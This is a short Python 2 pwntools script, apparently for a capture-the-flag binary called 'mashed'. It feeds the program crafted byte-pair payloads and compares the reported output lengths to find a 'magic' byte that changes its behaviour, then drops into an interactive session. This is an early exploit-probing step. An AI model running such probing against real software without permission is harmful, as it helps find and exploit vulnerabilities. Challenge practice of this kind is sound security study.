from pwn import *
p = process('./mashed')

def en(len, text):
	print p.recvuntil('Select :')
	p.sendline('2')
	print p.recvuntil('length:')
	p.sendline(str(len))
	print p.recvuntil(':')
	p.sendline(text)
	rdata = p.recvuntil('byte')
	print rdata
	rdata = rdata.split(' ')
	return int(rdata[1])

'''
cut 0,'\n'
x1x2x3	0\n0
251 
'''
l = []
for i in range(256):
	if i == 0x9c or i == 0 or chr(i) == '\n' or chr(i) == 'x':
		continue
	l.append(i)
ll = []
res = 0
for magic in l:
	payload  = ''
	for i in range(251):
		payload += chr(magic) + chr(l[i])
	payload += '\x00'
	nres = en(0x200 - 8 + 2, payload)
	ll.append(nres)
	if res == 0:
		res = nres
	elif nres > res:
		print 'found', magic 
		raw_input("jdkfjksdjfklsdj")
		break
print ll
p.interactive()
